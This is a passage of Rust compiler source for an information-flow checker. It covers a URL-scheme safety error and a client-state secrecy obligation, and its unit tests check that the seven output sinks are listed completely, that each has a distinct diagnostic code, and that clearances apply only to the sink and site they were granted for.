        let HirExprKind::Text(literal) = &self.ifc.hir.exprs[expr].kind else {
            return;
        };
        if zdc_hir::url_is_safe(literal) {
            return;
        }
        let scheme = zdc_hir::url_scheme(literal).unwrap_or_default().to_string();
        self.push_error(
            GraphError::new(
                "E-URL-01",
                format!(
                    "`{argument}` is a URL the browser dereferences, and `{scheme}:` is a scheme \
                     that executes rather than fetches."
                ),
                span,
            )
            .with_notes(vec![(
                span,
                format!("`{scheme}:` is not one of {}", allowed_schemes()),
            )]),
        );
    }

    /// The same, for a cell rather than for rendered markup.
    ///
    /// A component's own state is `client`-placed and may not be declared
    /// `secret` (§14D.1), so its required label is Public unconditionally —
    /// there is no `secret state` inside a component to relax it.
    fn require_client_state(&mut self, value: &Valued, span: Span, what: String) {
        self.oblige(Obligation {
            kind: ObligationKind::Escape(Sink::ClientState, SinkSite::ClientSignal(self.owner)),
            required: Secrecy::Public,
            found: value.label.value.clone(),
            pc: self.pc.clone(),
            site: span,
            what,
            found_trace: value.trace.clone(),
            pc_trace: self.pc_trace.clone(),
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use zdc_hir::ArenaId as _;

    /// §14G.1.3(c) names exactly seven sinks, and `CLOSED_LIST` is all of
    /// them. This assertion is one of the three locks; the other two are
    /// the absent `#[non_exhaustive]` and `Cleared`'s private field.
    ///
    /// This read `assert_eq!(Sink::CLOSED_LIST.len(), 7)` against a
    /// `[Sink; 7]`, which the compiler folds to `7 == 7`. It could not
    /// fail, so it did not lock anything: a sink added to the enum and
    /// left out of the list would have passed here. The match below is
    /// exhaustive, so a new variant is a compile error until it is named,
    /// and the round trip then fails until it is listed too.
    #[test]
    fn the_sink_list_is_closed_at_seven() {
        fn seen(sink: Sink) -> usize {
            match sink {
                Sink::ClientState => 0,
                Sink::View => 1,
                Sink::BuildArtifact => 2,
                Sink::ResponseBody => 3,
                Sink::PlatformLog => 4,
                Sink::LiveSync => 5,
                Sink::OutboundRequest => 6,
            }
        }

        let mut positions: Vec<usize> = Sink::CLOSED_LIST.iter().map(|s| seen(*s)).collect();
        positions.sort_unstable();
        positions.dedup();
        assert_eq!(
            positions,
            (0..7).collect::<Vec<usize>>(),
            "the closed list is not each of the seven sinks exactly once"
        );
    }

    /// Each sink's diagnostic code, against a table written out by hand so
    /// the assertion cannot agree with the implementation by construction.
    #[test]
    fn every_sink_has_its_own_code_and_description() {
        let expected = [
            (Sink::View, "E-IFC-05"),
            (Sink::ClientState, "E-IFC-06"),
            (Sink::BuildArtifact, "E-IFC-07"),
            (Sink::ResponseBody, "E-IFC-08"),
            (Sink::PlatformLog, "E-IFC-09"),
            (Sink::LiveSync, "E-IFC-10"),
            (Sink::OutboundRequest, "E-IFC-11"),
        ];
        assert_eq!(
            expected.len(),
            Sink::CLOSED_LIST.len(),
            "a sink was added without a code being decided for it"
        );
        for (sink, code) in expected {
            assert_eq!(sink.code(), code, "{sink:?}");
            assert!(!sink.describe().is_empty(), "{sink:?} has no description");
        }

        let mut codes: Vec<&str> = Sink::CLOSED_LIST.iter().map(|s| s.code()).collect();
        codes.sort_unstable();
        codes.dedup();
        assert_eq!(
            codes.len(),
            Sink::CLOSED_LIST.len(),
            "two sinks share a diagnostic code"
        );
    }

    /// A clearance is granted per `(sink, site)` pair and to nothing else.
    ///
    /// This asked a `Verdict::default()` — whose clearance set is empty by
    /// construction — for a clearance and asserted it got `None`. That
    /// holds for every argument, so the test could not distinguish
    /// `cleared` from a function returning `None` unconditionally, and its
    /// name ("cannot be forged") described a property of the private field
    /// that no runtime assertion can observe at all. A granted clearance is
    /// set up here, and both halves of the key are varied against it.
    #[test]
    fn a_clearance_is_scoped_to_the_pair_it_was_granted_for() {
        let granted = DefId::from_index(1);
        let other = DefId::from_index(2);
        let mut verdict = Verdict::default();
        verdict
            .cleared
            .insert((Sink::LiveSync, SinkSite::LiveSync(granted)));

        assert!(
            verdict
                .cleared(Sink::LiveSync, SinkSite::LiveSync(granted))
                .is_some(),
            "the pair that was granted must be cleared, or nothing below means anything"
        );
        assert!(
            verdict
                .cleared(Sink::View, SinkSite::LiveSync(granted))
                .is_none(),
            "a clearance for one sink must not authorise another"
        );
        assert!(
            verdict
                .cleared(Sink::LiveSync, SinkSite::LiveSync(other))
                .is_none(),
            "a clearance for one site must not authorise another"
        );
    }
}
